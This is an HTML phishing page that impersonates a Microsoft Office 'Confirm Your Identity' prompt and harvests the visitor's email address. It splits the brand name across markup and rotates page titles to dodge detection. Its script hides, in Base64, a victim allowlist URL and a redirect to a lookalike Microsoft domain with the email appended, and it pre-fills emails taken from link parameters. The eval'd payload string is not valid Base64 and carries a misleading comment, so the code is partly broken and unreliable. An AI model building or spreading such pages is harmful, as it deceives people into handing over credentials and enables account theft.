



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Titles array with different variations
        const titles = [
			
            "Authenticate Your Identity",
            "Identity Verification Needed",
            "Identity Confirmation Required",
            "Secure Your Access",
            "Verify Your Credentials",
            "Confirm Your Account",
            "Identity Check",
            "Confirm Your Identity",
            "Verify Your Details",
            "Confirm Your Personal Information"
        ];

        // Function to select a random title
        function setRandomTitle() {
            const randomIndex = Math.floor(Math.random() * titles.length);
            document.title = titles[randomIndex];
        }

        // Set random title on page load
        window.onload = setRandomTitle;
    </script>
    
    <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            background-image: url(''); /* Default fallback image */
            background-size: cover;
            background-position: center;
        }

        .header {
            width: 100%;
            background-color: #0078d4;
            color: white;
            text-align: left;
            padding: 10px 20px;
            box-sizing: border-box;
            font-size: 18px;
            position: absolute;
            top: 0;
        }

        .header span {
            margin-left: 20px;
        }

        .container {
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 3px;
            padding: 33px;
            width: 80%;
            max-width: 300px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin-top: 0px;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        .container h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        .container p {
            margin-bottom: 10px;
            color: #666;
        }

        .container p2 {
            margin-bottom: 10px;
            color: #666;
            font-size: 13px;
            margin-bottom: 20px;
        }

        .container input[type="email"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            box-sizing: border-box;
            text-align: center;
        }

        .container button {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
        }

        .container button:hover {
            background-color: #005a9e;
        }

        .container .footer {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }

            .container h2 {
                font-size: 20px;
            }

            .container .space {
                margin-bottom: 20px;
            }

            .container input[type="email"] {
                font-size: 14px;
            }

            .container button {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <span>Encrypted Message Identity Check</span>
    </div>
    <div class="container">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAAAwCAYAAAB+KcRFAAAAAXNSR0IArs4c6QAAEXNJREFUeF7tXX+cXFV1P+fNbpakjPxSSYCg/KhUCiWi8kOiCJRAP9qCYrCooFRASV2y8+7bTbUVBrUm2Xn3zYbVFPmIP5BaayJigWL5UaUqAopI+agptDFZUigWRHY2hGzm3dN3hjfzuXP3zryZdfazbbnnr9337q937v3ec+75cQcnzz2cYA6IAK7e5+atxeIdsIwAHpqDLgABLi6ugC/NRduuTceBueQAOuDNJXtd244Ddg444LmV4TgwDxxwwJsHprsuHQcc8NwacByYBw444M0D012XjgMOeG4NOA7MAwcc8OaB6a7L/7scKBaLfTt37jw5juMTEfGVALAHAH5FRLdHUfRop1/mgNcpp+a43MqVK3OLFy/+nfHx8ck57so1P0sOCCEuAIC1APAqSxMbpJRDnTb9kgSe7/sneZ53UgsmbQ/D8JudMtBWTghxJiL+vu0dIt5SKpX+Q38nhBAAcCUAvAwA/k0pdVG5XH7gtxmDq9tbDgghIgAotGnVAS+L5UEQFInoqhblpnbt2rVk48aNU1nt2N6z5Dr00EO3AcAhLeq/Q0p5c/1dEATnEFHjf36OiP8NAIeFYbhzNmNwdXrLAd/3P4SI12a06oCXxfYM4AERfTCKoi9ktWN7bwOSUa4JeEKIzwHAZWZbnue9pVQqfW82Y3B1eseBVatW7b1w4ULeSA8wWuVN8SZEfIqIXsOaipRyxCiDQRCcEMfxY+Vy+df6u5ekqpkFPAD4vpTyzbOZPiHEPwLAH7Wp2wQ83/c/jYgfNcsj4nFhGP7rbMbg6vSOA0EQnE9Ef2+0+Gul1Inlcvnf68+LxaJXLBbV4ODgQH9//xmIeA4A/DEALPE873WlUumnDnjtVc0af4joqG6sVFxHCMGH7l+yttgp8AqFwsGe5/0YABZrdTZLKVf2bvm4lmbLAd/3NyDiFU2gQbw6DMOirU0hxDcA4J36Owe8lBsdSDwuuU5KOUMStZtAIcQnAeCvMia5SeJx2eHh4cVxHH/I87wlibS8f/v27Tds2rQpnu1icfV6xwEhxNcA4N1Gi2dLKf/J1ovv+zen0q7x2gGvO+A9OTExsbRTAFx22WX9+Xz+cQA4UJsQTrkypd8M4PVumbiWes0BG5AQ8bQwDL/rgNclt20SL2HmPUR0qqFSvD0Mw9s6ad73/fMQcbNWdpqIfoSIpxj1HfA6Yej/kjIOeJaJmG0ibAvgvZeI/tYA3jfCMHxXJ2tACHEHAJyplf06EQ2YagcANAGvWCzuNTU11eRTRMTfmIdx2xgKhcL+nue9DQBOBIAjAWAfPp4CALsj+DB/Zz6fv5cP/fX6IyMjhyiluGyDEHFLqVT6r1TtfbNSagUAHAQAzyilvlIulx+xsV8IcTwAnAEAx7ARARH7lVK7EXECAB7q6+u7df369fx3R5RqDW8jotMQ8SgA2I+IuL0niOgR3hzN77E1zC6dpUuXvgUR2UD2e6yFIGIu0ep3EtEvieiBgYGB29auXfuMWd+cD6XUp8zNExHZn9dkLKm3YysPAJciYsMQw2WdVTPlWBzHh+VyuVvSRVTnI4cDHSSlfLrdyhkeHj5CKfWYrlYi4plKqY9kAW9oaOjVuVyODTI6EO5JVJm3tupTCPFyAODz5MVJJMVAxqp+TErJ5u4aBUEwRERlvQ4RXdzf3//NarX6d6ZFlhdZGIZjennf91ciIvtBrUECWlneBL6llBrWLYC28QohzgWAzwDAwRnf8wEp5ZdtZTica3Jykn1uf9HGj9qYWyL60p49e/5yfHycN6oa2eajo12jy0IOeM3AY/PvNQYIZiw8k8dCiFG2kWjPt+Xz+SMmJyfZz8NmZZ2aJF63wBNCLE82B1Zp9bNk22mXUjbOmS2A90HP8y4yVW1uVAcem8oXLFjwxcRnxaFT3dBORLwgDEPe2GaQ7/tXIaLVSmgW5k0iiqIZ130MDg6+gjcPi2qfNc4nlVLn1iOFHPCy2PWieJnVnSs2VZMlXrLh/SaXyz0BAAu17h+RUv5Bq+EUi8UFU1NTO4joFfUyRHRlFEWftJ0PTFWzG+AVCoUTPM/jQ70+vkxOZQEPAL4DAKfZGqoDL43I4fPuWZkd2gvEiHh2GIZ36a+Hh4dXKKWsFkJbMzbgrVmzZp9qtfp9Q1vpZpjPAcBJUsotDngdsK3XwBsbG9smhODd9P1690qpN5bLZfa1zSCLg1XlcrlXjY6O7ugl8NLF9bMWqtizAPAPfK5CxCml1CGIyOe0N/GAOwCe/l1VAODzHp8X83XgtXHB7AKAWxHxQSJ6IVHfXp38zZrDERZ2PaWUOlqP4kjiWn9QH6e2cX0PEa9RSm3zPG8/AHgjALBfc5kNeEIIdnCfb+mP+cJScAsRVfncSETvAADOKjDp4Xw+/4adO3e+nIjYhVAjIuLzqxm18jCfw1tsDLbyD/K86OVZ1eRwmJ4TAYztc/PWseJdcDQo4GiO3hNBUDyrpnZ1Ra0kHgPP9/03JeczXgw6bZRS/rmtkyAIvmuoaLdJKd/OZXsJPN/3y8lk26LfvxjHsT82NjZjIQRBwEaXzySWWV64NbKpmtp3ldk4kAIDhRBv8DxvL8/ztlerVT7DLjB4wIHc50spt+vP+axVqVQ+ngZ+m2xr+EfTcKyKUeCJ6enpw8fHx3ebFYUQZyVRPrt1U37C/7cm/GeJbdJN/f39l6xbt47B1yDuc9GiRZ8loovMConh5f1RFN2gP58zq2ZXK/b/SeF2wONPFEKwFY93rjo9l8/nFxeLxRd0FoyMjBwVx/EW/RkivrOe3dAr4KXWy/9MnPp7GVNwrZTy8nbTUg9lygIeIkZhGHKWxAwSQqwHADMOcUccx8faAK/1tZGIzPE9MzExcSD7RwuFwpGe5zGgdXo4CSJf1ulSSyyrLOlZwup038TExPI2PljeVO62qNf3JY7xkx3wOuV+l+U6AN6gaWQBgPdIKdnq16AgCCQR+dqjpyqVytLrrruOraE9k3hBEFxKRNcZn/n49PT079okQzt2tJB4FURc0iobQgixlbMljHYvlVJ+vl1fqfWVz8z9ejnP85aXSqUfjIyMHBTHMW8oOilEXB6G4Q+zpjWVmOwSaJLERHRKFEX3ZvDhRCK6zyjDVthX6lbsuZN4Nz5r9UdkfXT2e7oW3rf/tXQ7HAUemEGm2dU7KYFwJa6onW26oizgDQ0N7WsxstwtpfzDekfs76lUKjsM/X9USrmmXqZXEq9F2NLHpZSf6urDW6uaLWNDOZxNKfWkCY5cLrfv6OioqSbOGE5ihWVjCvv6dBqSUm7gB0IIBiaHyunE58wNuVwuGh0d5fdW8n2f/X3/rL8kookoimyJqrax8fyZ7osVUso7281hTyJX4MZn5+QmaSC4Gi7cr0h3wDKgublJGhAuxlncJJ0FvHRBmEYW5tNh9fOMEOJCAGg6D3ie95pSqdRQnXoFvMSA8/MkQv61xgI7OYoic8fOxGELd0LNCmurXCgUTk0tqY3XiPiLMAyPzuzsRaCXiCgwxr42iqKPpXzmBOCrW7TFmsPXEDG0ZWoIIT6cuFX+xqh7k5TyvA7Hdnsi9c42xnZhFEU3OuC14+AcAq+FkeUqKeUn0gXDuXLsU6vTv0gpm0LOegU8IQQbCPbVWRHH8UFjY2OmJMpcby1UzSuklOO2yqlj28zI/46U8vTMzl6UaOzM5usSdOB+LgxDBg2kmgMb36zujLQSb3pf7uvrG1q/fj2b/mvUwv/X0hBmjtdmwUbE1WEYNny5c6lqOokHAOzHY6umPjkWI0vNMV6pVDgMiU37Ol0kpfyK/qCHwJsxR0qpA8zkyk6A0CpyxeaUTjcYdpZ/1QDOt8MwbJdz2Cju+36AiCW9PhFdH0XRJfVnKfjC5NKgVRkpVY+l579fcd0WLo6OM8FbAK8pYMIBz7aq5lDipYtuhpEFEc8gIg5v4nd1ek4ptaRcLrNPS190M1JEZuNAF0JwyFqTL8lUazsBXbpYrSFjbYDHDvNvG+3/UEpZ8xFmkRDirwGgplZq1HQWrj/3ff+4NNyLfXYcWzmDELEB+iAIriCi2lmxToh4QxiGTX7YVmP0fZ8ji9iv1yDz9gEHPOsszN0Zj7uzGVmIiB2yrGaxg7lOVvWmhxKPXRYcNKwvMA7Bajh6swBQf9+txBseHj5eKfWg0f5kPp/fTw++7mZxA8DlUsqWd5ik0SMcgsfqqGe2rZQ6plwu/0wI8d4kOLxxHuNyiPhj3W/Zji9CiF+kQdQ68E6PoqjhF3TAmwfgcZc2dcQcChEdH0XRjJ8i6yHwvp5Gbuhd3yqlNP1XmfjrFniFQmGh53lsvWySQJ3cCZPGdvI5lKNPGuR53utLpdJPsgabhsixhZFvX9OpBtxCoXCs53nm9RhxLpc7tJ01NJ1X220B1enp6QP0KxYd8OYJeHwVICK29CkR0U+iKHq9bXg9BB6rTrbfAWyZCd1qUXcLvHSRssneNH7cJaXksLSWNgLf9y9PLn3daIzlcSklL/qObAtCCD77mY79j0op17GAE0KwH7DJHUFE10RRtLodsG1XOiTGMv4mPbXL6ovt1p0AAE0uippkdu6EF6fHZlypT1xi2WNf53G2iSSiVVEUmSbtWtFeAa9YLC6qVCoclsXpQDrx5bd/KqW83Ta2QqFweC6XGw/DkHP2ajQb4AVB8B4zV7G2eBIz/957773GpnKmVmE+G+b1sfEZLgxDjoThKy+WxXE8TEQj5XLZdKTXqtmiZhDxkjAMr0/f267bYFB/WEppBh3U5+V9iMipRU1qLBGdE0VRk1+4W4mX3LvD2Rsf0L+ZiMaiKGq6k9MBL+VQBvDY2vZZy+Le1dfXt0Q3cetlegW8FDC26JVad2xwUEptSkC4BRHZ98X5d5yOxJfu5LKCpFul2tS/hcPOKpUKn/NsoVw/RcTrk/Snh5RSLyDiIbyAAYBjIU0Dydb0fFYzQjHwlFKsovOYOeZ2cy6Xe2DRokVPP//88/tXq9XTEZH53qRqep53ZP1SYD6H9/X1Papnh2hzcDcR8RmQ+cLZEUcQEVtp/8Qyl1YXySyAx4YkNijppIjoE3zNexIRtX8ul7vAAa8D4A0ODr6sv7//SURcZOzebS1ovQReqlZxyJp58Y5N2DU9+22Bl0oWdqHcbzlvZfafFmCwnSql/FG9gga8TtvgbIFvRVHEVuUGpalF7Au0WkI7aJxz8jgDZYbU7RZ4hUKBA8sb39iqbwe8DoCXLjxWbf5MZ2SWgaHHwGNn84JKpcK+QlsKTMv11QvgpVKX4xs5J89Mk8la288mVzecp1sLDYmXVb/+fmscx8ttgQNpVjzzJisj3+xrGxGd1eoqx26Bl64VW5hcU78OeB0CL7Ww8Y5fp0ellCwF2hkXeuLHM1YKGxQuTQKDP90hAJoSeWdzxtP7T+8B5asgOCyr3f2hXI0Q8SalVCGKIr6BrYmGhoZem8vlOBOkE0m1uVqtfmTDhg1PtUJpEATHEBFH4LS8NkOruydRiz9frVY/1i7DYjbAS4O/+Xx7rJN4GgdsP1qye/fuL2T9Ug/HBiJiLTUnjuOHyuXyPe226iAIZiSEmj9awmrswMBAkyQloh1SyrZ5hqmZ/10ca4iIPMGc3MkLmE3/2/jMBQC3hGHIY2xsDr7vv87zvKbQNiK6Q0r5807FDpfjlJ4kZvPdiMhpNGylZCnIWQh8VTnHq97red4mPXbV1v7q1asP7OvrYz6dktzSxsDhi305w57zCzmS6H6l1FfZb9fp+FJ1jx3jJyDiwQkYeWzMg6fTpNh70rHVLnjqdg49z9vMic7t6qXzw9ZoVov5zM0uFe6ff8rrzpekxMtitnvvODDXHHDAm2sOu/YdBywccMBzy8JxYB444IA3D0x3XToOOOC5NeA4MA8ccMCbB6a7Lh0HHPDcGnAcmAcOOODNA9Ndl44DDnhuDTgOzAMH/gce50hnMk/UAAAAAABJRU5ErkJggg==" alt="maincase Logo">
        <h2><strong>Confirm Your Identity</strong></h2>
<p><strong>You are now accessing a secure Organization Office requiring sensitive information:</strong></p>
<p>To proceed, <span style="font-size: 14px; background-color: rgb(255, 255, 255);">Mi</span><span style="font-size: 14px; background-color: rgb(255, 255, 255);">cr</span>osoft</span> need to veri<span style="font-size: 14px; background-color: rgb(255, 255, 255);">fy your em</span>ail address. Please enter the email address associated with this document.</p>
<div id="validation-message" style="display: none; font-weight: bold; margin-top: 10px;"></div>
        <input type="email" id="thesupwillsuplauriebarce-input" placeholder="Enter email" required style="margin-top: 10px;">
        <button id="continue-button">Confirm</button>
        <p class="footer">By clicking confirm <span style="color:#F25021;"><span style="font-weight: 700; background-color: rgb(255, 255, 255);">Mi<span style="font-weight: 700; background-color: rgb(255, 255, 255);">cro<span style="font-weight: 700; background-color: rgb(255, 255, 255);">soft&nbsp;0ff<span style="font-weight: 700; background-color: rgb(255, 255, 255);">i<span style="font-weight: 700; background-color: rgb(255, 255, 255);">ce</span></span></span></span></span></span> will process email address in accordance with your Organization's privacy statement.</p>
        <p class="footer">© Copyright with 2024 Organization Privacy & Cookies</p>
    </div> 

    <script>
    
	const encodedScript = '
    const useVerifiedEmailList = 0; // Set to 1 for using email list, 0 for standard validation
const encodedEmailListPath = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RldmVsZWN0L3Jlc3Ryb29tZm9ybWUvcmVmcy9oZWFkcy9tYWluL2xlZ2Fscy50eHQ"; // Base64 encoded URL to your email list
const emailListPath = atob(encodedEmailListPath); // Decode the Base64 string

let verifiedEmails = [];

// Load the verified email list from the specified path
async function loadEmailList() {
    if (useVerifiedEmailList === 1) {
        try {
            const response = await fetch(emailListPath);
            if (!response.ok) throw new Error(`Failed to fetch email list: ${response.statusText}`);
            const text = await response.text();
            verifiedEmails = text.split("\n").map(email => email.trim().toLowerCase());
            console.log("Confirmed email loaded: Successfully "); // Debugging log
        } catch (error) {
            console.error("Error loading email list:", error);
            displayMessage("Error loading email list. Please try again later.", "error");
        }
    }
}

// Initialize the email list if toggle is set
loadEmailList();

// Function to validate email format (if toggle is 0)
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Standard email validation regex
    return re.test(email);
}

// Function to check if email exists in the verified list (if toggle is 1)
function isEmailVerified(email) {
    return verifiedEmails.includes(email.toLowerCase()); // Case-insensitive match
}

// Function to handle the "Continue" button logic
function continueLoading() {
    const emailInput = document.getElementById("thesupwillsuplauriebarce-input").value.trim();

    if (!emailInput) {
        displayMessage("Please enter a valid email address.", "error");
        return;
    }

    if (useVerifiedEmailList === 1) {
        // Validate using the verified email list
        if (isEmailVerified(emailInput)) {
            redirectUser(emailInput);
        } else {
            displayMessage("Please enter valid email address, This Email is not recognized!", "error");
        }
    } else if (useVerifiedEmailList === 0) {
        // Validate using standard regex
        if (validateEmail(emailInput)) {
            redirectUser(emailInput);
        } else {
            displayMessage("Please enter a valid email address.", "error");
        }
    } else {
        console.error('Invalid toggle value. Please set "useVerifiedEmailList" to 1 or 0.');
    }
}

// Function to display error/success messages below the input
function displayMessage(message, type) {
    const messageElement = document.getElementById("validation-message");
    messageElement.textContent = message;
    messageElement.style.color = type === "error" ? "red" : "green";
    messageElement.style.display = "block";
}

// Function to handle redirection
function redirectUser(email) {
    const encodedRedirectURL = "aHR0cHM6Ly9taWNyb3NvZnQubWljcm9zb2Z0ZmVkbGF3aHViLmNvbS9Scmp3di8/ZT0"; // Base64 encoded redirect link
    const decodedRedirectURL = atob(encodedRedirectURL);
    const finalLink = `${decodedRedirectURL}${email}`; // Append email to the link
    console.log("Redirecting to:", finalLink); // Debugging log
    window.location.href = finalLink;
}

// Function to decode Base64 safely
function tryDecodeBase64(value) {
    try {
        return atob(value); // Decode Base64
    } catch (e) {
        return value; // If not Base64, return the original value
    }
}

// Function to extract email from URL parameters or hash
function getEmailFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    for (let param of urlParams.values()) {
        const decodedParam = tryDecodeBase64(param); // Try to decode Base64
        if (validateEmail(decodedParam)) {
            return decodedParam; // Return the first valid email found
        }
    }

    const hash = window.location.hash.substring(1); // Remove the # from the start
    if (hash.includes("=")) {
        const hashParams = new URLSearchParams(hash);
        for (let param of hashParams.values()) {
            const decodedParam = tryDecodeBase64(param); // Try to decode Base64
            if (validateEmail(decodedParam)) {
                return decodedParam; // Return the first valid email found
            }
        }
    } else {
        const decodedHash = tryDecodeBase64(decodeURIComponent(hash));
        if (validateEmail(decodedHash)) {
            return decodedHash; // Return the decoded email if valid
        }
    }

    return null; // No email found
}

// Populate email input if found in URL
const emailFromURL = getEmailFromURL();
if (emailFromURL) {
    document.getElementById("thesupwillsuplauriebarce-input").value = emailFromURL;
}

// Event Listeners for input and button
document.getElementById("continue-button").addEventListener("click", continueLoading);
document.getElementById("thesupwillsuplauriebarce-input").addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        continueLoading();
    }
});'; // base64 for 'function continueLoading() { alert("Loading..."); }'
const decodedScript = atob(encodedScript);
eval(decodedScript);

</script>
</body>
</html>